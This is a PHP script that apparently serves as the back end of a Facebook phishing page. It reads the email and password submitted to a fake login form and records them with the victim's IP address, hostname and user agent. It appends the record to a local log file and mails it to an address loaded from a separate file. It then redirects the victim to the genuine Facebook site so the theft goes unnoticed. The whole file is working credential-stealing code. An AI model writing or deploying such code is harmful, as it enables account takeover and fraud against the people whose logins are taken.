<?php
if($_POST["email"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------FaceBook Info-----------------------\n";
$message .= "Email Address            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['pass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$text = fopen('log.txt', 'a');
fwrite($text, $message);$subject = "FB | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://web.facebook.com");
}else{
header ("Location: https://web.facebook.com");
}

?>